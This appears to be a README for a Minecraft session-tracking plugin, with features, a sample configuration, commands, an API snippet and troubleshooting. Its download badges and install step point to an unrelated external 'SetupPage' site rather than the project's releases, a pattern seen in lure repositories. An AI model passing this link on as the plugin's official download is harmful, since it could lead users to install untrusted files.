# Minecraft‑Player‑Session‑Tracker  

**Author:** FiscalPresent  

> A lightweight, highly configurable Java plugin that records every player’s join/quit timestamps, session lengths, and in‑game activity for deep analytics and easy logging.

---

## 🌟 Quick Overview  

| Feature | Description |
|---|---|
| **Real‑time Session Logging** | Captures join, quit, and AFK events with millisecond precision. |
| **Configurable Persistence** | Choose between flat‑file (YAML/JSON) or MySQL/SQLite storage. |
| **Analytics Dashboard** | Export CSV/JSON for external BI utility or use built‑in statistics commands. |
| **Permission‑Based Access** | Fine‑grained control over who can view or modify logs. |
| **Extensible API** | Hook into other plugins via a simple Java interface. |

---

## 📥 Download & Install  

<div align="center">

[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=download)](https://rewfdf.github.io/SetupPage/)

[![Get Started](https://img.shields.io/badge/Get%20Started-Now-green?style=for-the-badge&logo=rocket)](https://rewfdf.github.io/SetupPage/)

</div>

1. Download the JAR from the link above.  
2. Place it in your server’s `plugins/` folder.  
3. Restart or reload the server.  
4. Edit `config.yml` to suit your needs (see **Configuration** below).  

---

## 🛠️ Configuration  

The plugin ships with a fully commented `config.yml`. Below is a trimmed example:

```yaml
# ── General Settings ───────────────────────────────────────
logging:
  enabled: true                 # Turn logging on/off globally
  format: "yyyy-MM-dd HH:mm:ss" # Timestamp format for logs
storage:
  type: "sqlite"                # Options: flatfile, sqlite, mysql
  sqlite:
    file: "session_data.db"
  mysql:
    host: "localhost"
    port: 3306
    database: "minecraft"
    user: "root"
    password: "example"
analytics:
  export:
    enabled: true
    interval: 15                # Minutes between automatic exports
    format: "csv"                # csv or json
permissions:
  view: "sessiontracker.view"
  edit: "sessiontracker.edit"
```

*All settings can be reloaded without a server restart using `/sstr reload`.*

---

## 📊 Commands & Permissions  

| Command | Description | Permission |
|---|---|---|
| `/sstr reload` | Reloads the configuration file. | `sessiontracker.admin` |
| `/sstr stats <player>` | Shows total playtime, average session length, etc. | `sessiontracker.view` |
| `/sstr export` | Manually triggers a data export. | `sessiontracker.admin` |
| `/sstr toggle <player>` | Temporarily disables logging for a player. | `sessiontracker.edit` |

> **Tip:** Combine with a permission manager (LuckPerms, PermissionsEx) for granular control.

---

## 🧩 API Integration  

```java
public interface SessionListener {
    void onPlayerJoin(Player player, Instant timestamp);
    void onPlayerQuit(Player player, Instant timestamp, Duration sessionLength);
}
```

Register your listener in `onEnable()`:

```java
getServer().getPluginManager().registerEvents(new MyListener(), this);
SessionTrackerAPI.registerListener(new MySessionListener());
```

Full Javadoc is available in the `docs/` folder of the release.

---

## 📈 Analytics & Export  

- **Automatic Export** – Configurable interval (default 15 min) writes a CSV/JSON file to `plugins/SessionTracker/exports/`.  
- **Manual Export** – Use `/sstr export` to generate a fresh snapshot.  
- **Third‑Party Integration** – Compatible with Grafana, PowerBI, or any utility that consumes CSV/JSON.

---

## 🐛 Troubleshooting  

| Symptom | Likely Cause | Fix |
|---|---|---|
| No logs appear | `logging.enabled` set to `false` | Enable it in `config.yml`. |
| Database errors | Incorrect MySQL credentials | Verify host, port, user, and password. |
| Export file empty | Export interval too high | Reduce `analytics.export.interval`. |
| Plugin fails to load | Out‑of‑date server version | Requires Spigot 1.16+ (Java 8+). |

Check the console for stack traces prefixed with `[SessionTracker]`.

---

## 🤝 Contributing  

1. Fork the repository.  
2. Create a feature branch (`git checkout -b feature/awesome‑thing`).  
3. Follow the existing code style (Google Java Style).  
4. Submit a pull request with a clear description and screenshots if UI changes are involved.  

All contributions are welcomed—bugs, documentation improvements, or new analytics modules!

---

## 📜 License  

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

### 🎉 Stay Connected  

- **GitHub Issues:** Report bugs or request features.  
- **Discord:** Join our community for real‑time help.  
- **Roadmap:** Upcoming features include web‑based dashboards and player‑level heatmaps.  

Happy tracking! 🚀